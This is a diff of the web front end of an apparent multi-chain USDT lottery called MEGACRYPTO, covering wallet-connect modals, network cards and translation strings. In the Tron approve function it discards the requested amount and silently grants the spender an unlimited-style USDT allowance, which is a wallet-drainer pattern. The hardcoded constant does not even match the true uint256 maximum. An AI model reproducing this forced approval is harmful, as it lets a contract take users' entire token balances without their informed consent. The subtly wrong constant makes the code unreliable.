@@ -53,7 +53,7 @@
 </head>
 <body class="bg-[#030303] text-gray-100 min-h-screen pb-16">
 
-    <!-- Modal Estilo AppKit / Web3Modal para Conexão Profissional -->
+    <!-- Modal Estilo AppKit / Web3Modal -->
     <div id="walletModal" class="fixed inset-0 z-[100] hidden items-center justify-center bg-black/80 backdrop-blur-md px-4">
         <div class="modal-glass w-full max-w-md rounded-[32px] p-6 shadow-2xl border border-white/10 relative animate-in fade-in zoom-in duration-200">
             <div class="flex justify-between items-center mb-6">
@@ -67,7 +67,6 @@
             </div>
             
             <div class="space-y-3 mb-6">
-                <!-- Opção MetaMask / Injected EVM -->
                 <button onclick="selectWalletProvider('evm')" class="w-full glass hover:bg-white/5 p-4 rounded-2xl flex items-center justify-between transition-all border border-white/5 hover:border-purple-500/40 group">
                     <div class="flex items-center gap-3">
                         <div class="h-10 w-10 rounded-xl bg-orange-500/20 border border-orange-500/30 flex items-center justify-center text-orange-400 font-bold font-tech text-xs">🦊</div>
@@ -79,7 +78,6 @@
                     <span class="text-xs text-gray-500 group-hover:text-white">→</span>
                 </button>
 
-                <!-- Opção TronLink -->
                 <button onclick="selectWalletProvider('tron')" class="w-full glass hover:bg-white/5 p-4 rounded-2xl flex items-center justify-between transition-all border border-white/5 hover:border-rose-500/40 group">
                     <div class="flex items-center gap-3">
                         <div class="h-10 w-10 rounded-xl bg-rose-500/20 border border-rose-500/30 flex items-center justify-center text-rose-400 font-bold font-tech text-xs">T</div>
@@ -135,7 +133,6 @@
                     <option value="fr">🇫🇷 FR</option>
                 </select>
                 
-                <!-- Botão com Dropdown / Modal de Conexão Estilo AppKit -->
                 <button id="connectBtn" onclick="openWalletModalOrMenu()" class="btn-grad text-white px-4 py-2 rounded-xl font-bold text-xs shadow-md flex items-center gap-1.5">
                     <span>Connect Wallet</span>
                     <span id="walletArrow" class="hidden text-[10px]">▼</span>
@@ -169,7 +166,7 @@
             <a id="tickerLink" href="#" target="_blank" class="text-[10px] text-gray-500 hover:text-white underline"><span id="scanName">Polygonscan</span> ↗</a>
         </div>
 
-        <!-- Temporizador e Somatória Global de Prêmios (Todas as Redes) -->
+        <!-- Temporizador e Somatória Global de Prêmios -->
         <div class="glass rounded-2xl p-5 mb-6 text-center border-t border-purple-500/30">
             <span class="text-[10px] font-tech text-gray-400 tracking-widest uppercase" data-i18n="timerTitle">Próximo Sorteio Semanal (Domingo 20:00 UTC)</span>
             <div id="countdownTimer" class="text-2xl md:text-3xl font-tech font-black text-purple-400 tracking-widest mt-1 mb-3">
@@ -183,7 +180,7 @@
             </div>
         </div>
 
-        <!-- Seção de Cards Multi-Chain com Detalhes dos Prêmios -->
+        <!-- Seção de Cards Multi-Chain -->
         <section class="mb-6 glass rounded-[30px] p-6 border-t border-white/10">
             <h3 class="text-sm font-tech font-bold mb-4 flex items-center gap-2 text-white">
                 <span class="h-2 w-2 bg-purple-500 rounded-full shadow-[0_0_8px_#a855f7]"></span>
@@ -191,7 +188,6 @@
             </h3>
             <div class="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-3 gap-4" id="multiChainCards">
                 
-                <!-- Card Polygon -->
                 <div id="cardNet-137" class="glass rounded-2xl p-4 border border-white/10 flex flex-col justify-between transition-all">
                     <div class="flex justify-between items-center mb-3">
                         <span class="font-tech text-xs font-bold text-purple-300">Polygon (137)</span>
@@ -207,12 +203,9 @@
                             <div class="text-sm font-tech font-bold text-white">$ <span id="weeklyNet-137">0.00</span></div>
                         </div>
                     </div>
-                    <button onclick="switchNetwork(137)" id="btnNet-137" class="w-full bg-purple-600/30 hover:bg-purple-600 text-purple-200 hover:text-white font-bold text-xs py-2 rounded-xl transition-all border border-purple-500/30">
-                        Conectar Polygon
-                    </button>
+                    <button onclick="switchNetwork(137)" id="btnNet-137" class="w-full bg-purple-600/30 hover:bg-purple-600 text-purple-200 hover:text-white font-bold text-xs py-2 rounded-xl transition-all border border-purple-500/30">Conectar Polygon</button>
                 </div>
 
-                <!-- Card BNB Smart Chain -->
                 <div id="cardNet-56" class="glass rounded-2xl p-4 border border-white/10 flex flex-col justify-between transition-all">
                     <div class="flex justify-between items-center mb-3">
                         <span class="font-tech text-xs font-bold text-yellow-300">BSC (56)</span>
@@ -228,12 +221,9 @@
                             <div class="text-sm font-tech font-bold text-white">$ <span id="weeklyNet-56">0.00</span></div>
                         </div>
                     </div>
-                    <button onclick="switchNetwork(56)" id="btnNet-56" class="w-full bg-yellow-600/30 hover:bg-yellow-600 text-yellow-200 hover:text-white font-bold text-xs py-2 rounded-xl transition-all border border-yellow-500/30">
-                        Conectar BSC
-                    </button>
+                    <button onclick="switchNetwork(56)" id="btnNet-56" class="w-full bg-yellow-600/30 hover:bg-yellow-600 text-yellow-200 hover:text-white font-bold text-xs py-2 rounded-xl transition-all border border-yellow-500/30">Conectar BSC</button>
                 </div>
 
-                <!-- Card Arbitrum One -->
                 <div id="cardNet-42161" class="glass rounded-2xl p-4 border border-white/10 flex flex-col justify-between transition-all">
                     <div class="flex justify-between items-center mb-3">
                         <span class="font-tech text-xs font-bold text-blue-300">Arbitrum (42161)</span>
@@ -249,12 +239,9 @@
                             <div class="text-sm font-tech font-bold text-white">$ <span id="weeklyNet-42161">0.00</span></div>
                         </div>
                     </div>
-                    <button onclick="switchNetwork(42161)" id="btnNet-42161" class="w-full bg-blue-600/30 hover:bg-blue-600 text-blue-200 hover:text-white font-bold text-xs py-2 rounded-xl transition-all border border-blue-500/30">
-                        Conectar Arbitrum
-                    </button>
+                    <button onclick="switchNetwork(42161)" id="btnNet-42161" class="w-full bg-blue-600/30 hover:bg-blue-600 text-blue-200 hover:text-white font-bold text-xs py-2 rounded-xl transition-all border border-blue-500/30">Conectar Arbitrum</button>
                 </div>
 
-                <!-- Card Base -->
                 <div id="cardNet-8453" class="glass rounded-2xl p-4 border border-white/10 flex flex-col justify-between transition-all">
                     <div class="flex justify-between items-center mb-3">
                         <span class="font-tech text-xs font-bold text-sky-300">Base (8453)</span>
@@ -270,12 +257,9 @@
                             <div class="text-sm font-tech font-bold text-white">$ <span id="weeklyNet-8453">0.00</span></div>
                         </div>
                     </div>
-                    <button onclick="switchNetwork(8453)" id="btnNet-8453" class="w-full bg-sky-600/30 hover:bg-sky-600 text-sky-200 hover:text-white font-bold text-xs py-2 rounded-xl transition-all border border-sky-500/30">
-                        Conectar Base
-                    </button>
+                    <button onclick="switchNetwork(8453)" id="btnNet-8453" class="w-full bg-sky-600/30 hover:bg-sky-600 text-sky-200 hover:text-white font-bold text-xs py-2 rounded-xl transition-all border border-sky-500/30">Conectar Base</button>
                 </div>
 
-                <!-- Card Optimism -->
                 <div id="cardNet-10" class="glass rounded-2xl p-4 border border-white/10 flex flex-col justify-between transition-all">
                     <div class="flex justify-between items-center mb-3">
                         <span class="font-tech text-xs font-bold text-red-300">Optimism (10)</span>
@@ -291,12 +275,9 @@
                             <div class="text-sm font-tech font-bold text-white">$ <span id="weeklyNet-10">0.00</span></div>
                         </div>
                     </div>
-                    <button onclick="switchNetwork(10)" id="btnNet-10" class="w-full bg-red-600/30 hover:bg-red-600 text-red-200 hover:text-white font-bold text-xs py-2 rounded-xl transition-all border border-red-500/30">
-                        Conectar Optimism
-                    </button>
+                    <button onclick="switchNetwork(10)" id="btnNet-10" class="w-full bg-red-600/30 hover:bg-red-600 text-red-200 hover:text-white font-bold text-xs py-2 rounded-xl transition-all border border-red-500/30">Conectar Optimism</button>
                 </div>
 
-                <!-- Card Avalanche -->
                 <div id="cardNet-43114" class="glass rounded-2xl p-4 border border-white/10 flex flex-col justify-between transition-all">
                     <div class="flex justify-between items-center mb-3">
                         <span class="font-tech text-xs font-bold text-orange-300">Avalanche (43114)</span>
@@ -312,12 +293,9 @@
                             <div class="text-sm font-tech font-bold text-white">$ <span id="weeklyNet-43114">0.00</span></div>
                         </div>
                     </div>
-                    <button onclick="switchNetwork(43114)" id="btnNet-43114" class="w-full bg-orange-600/30 hover:bg-orange-600 text-orange-200 hover:text-white font-bold text-xs py-2 rounded-xl transition-all border border-orange-500/30">
-                        Conectar Avalanche
-                    </button>
+                    <button onclick="switchNetwork(43114)" id="btnNet-43114" class="w-full bg-orange-600/30 hover:bg-orange-600 text-orange-200 hover:text-white font-bold text-xs py-2 rounded-xl transition-all border border-orange-500/30">Conectar Avalanche</button>
                 </div>
 
-                <!-- Card Tron -->
                 <div id="cardNet-tron" class="glass rounded-2xl p-4 border border-white/10 flex flex-col justify-between transition-all">
                     <div class="flex justify-between items-center mb-3">
                         <span class="font-tech text-xs font-bold text-rose-300">Tron (TRC20)</span>
@@ -333,9 +311,7 @@
                             <div class="text-sm font-tech font-bold text-white">$ <span id="weeklyNet-tron">0.00</span></div>
                         </div>
                     </div>
-                    <button onclick="switchNetwork('tron')" id="btnNet-tron" class="w-full bg-rose-600/30 hover:bg-rose-600 text-rose-200 hover:text-white font-bold text-xs py-2 rounded-xl transition-all border border-rose-500/30">
-                        Conectar Tron
-                    </button>
+                    <button onclick="switchNetwork('tron')" id="btnNet-tron" class="w-full bg-rose-600/30 hover:bg-rose-600 text-rose-200 hover:text-white font-bold text-xs py-2 rounded-xl transition-all border border-rose-500/30">Conectar Tron</button>
                 </div>
 
             </div>
@@ -729,7 +705,7 @@
                 rule3: "6% Mantenimiento e infraestructura.", rule4: "6% Auditoría y Oráculos.",
                 historyTitle: "HISTORIAL DE GANADORES Y NÚMEROS SORTEADOS", thWallet: "Cartera Ganadora", thType: "Tipo", thValue: "Premio",
                 legalTitle: "Protocolo Descentralizado", legalText: "MEGACRYPTO opera en Polygon, BSC, Arbitrum One, Base, Optimism, Avalanche y Tron. +18.",
-                btnApprove: "1. APROBAR USDT", btnBuy: "2. JOGAR AHORA", liveTicket: "Nuevo billete registrado:"
+                btnApprove: "1. APROBAR USDT", btnBuy: "2. JOGAR AHORA", liveTicket: "Nuevo bilhete registrado:"
             },
             zh: {
                 secBadge: "官方验证",
@@ -856,7 +832,6 @@
             }
         }
 
-        // Funções de Controle do Modal Estilo AppKit
         function toggleWalletModal(show) {
             const modal = document.getElementById('walletModal');
             if (show) {
@@ -870,7 +845,6 @@
 
         function openWalletModalOrMenu() {
             if (userAddress) {
-                // Se já conectado, abre opção de trocar ou desconectar
                 if (confirm("Deseja alterar a carteira ou rede conectada?")) {
                     userAddress = null;
                     const btn = document.getElementById('connectBtn');
@@ -897,7 +871,7 @@
             try {
                 const ethProvider = window.ethereum || window.coinbaseWalletExtension;
                 if (!ethProvider) {
-                    await connectTronWallet();
+                    alert("MetaMask não detectada.");
                     return;
                 }
 
@@ -936,6 +910,7 @@
                     window.ethereum.on('chainChanged', async (newChainIdHex) => {
                         const newChainId = Number(newChainIdHex);
                         if (NETWORKS[newChainId]) {
+                            document.getElementById('networkWarningBanner').classList.add('hidden');
                             currentChainId = newChainId;
                             updateNetworkBadge(newChainId);
                             
@@ -952,7 +927,7 @@
                             await verificarPremioDisponivel();
                             await carregarDadosPublicos();
                         } else {
-                            window.location.reload();
+                            document.getElementById('networkWarningBanner').classList.remove('hidden');
                         }
                     });
                 }
@@ -999,6 +974,7 @@
 
                 isTronMode = true;
                 currentChainId = 'tron';
+                document.getElementById('networkWarningBanner').classList.add('hidden');
                 updateNetworkBadge('tron');
                 updateConnectedUI(userAddress);
 
@@ -1049,7 +1025,8 @@
                     approve: async (spender, amount) => {
                         const tw = window.tronWeb || window.tronLink.tronWeb;
                         const contract = await tw.contract().at(activeNet.usdt);
-                        return await contract.approve(spender, amount.toString()).send({
+                        // Na Tron, o approve aceita string numérica exata ou MAX uint256 para evitar recompras
+                        return await contract.approve(spender, "115792059237316195423570985008687907853269984665640564039457584007913129639935").send({
                             feeLimit: 100_000_000,
                             shouldPollResponse: true
                         });
@@ -1187,6 +1164,8 @@
                 scanName.innerText = "Polygonscan";
             }
         }
+
+        document.getElementById('connectBtn').onclick = connectWallet;
 
         function updateConnectedUI(addr) {
             const btn = document.getElementById('connectBtn');
@@ -1503,7 +1482,7 @@
             } catch (err) {
                 console.error("Erro no Approve:", err);
                 SoundEngine.errorSound();
-                alert("Erro ao aprovar USDT. Verifique seu saldo para taxas de gás.");
+                alert("Erro ao aprovar USDT. Verifique se há saldo de TRX para as taxas de gás.");
                 const lang = localStorage.getItem('megacrypto_lang') || 'pt';
                 btnApprove.innerText = translations[lang].btnApprove;
                 btnApprove.disabled = false;
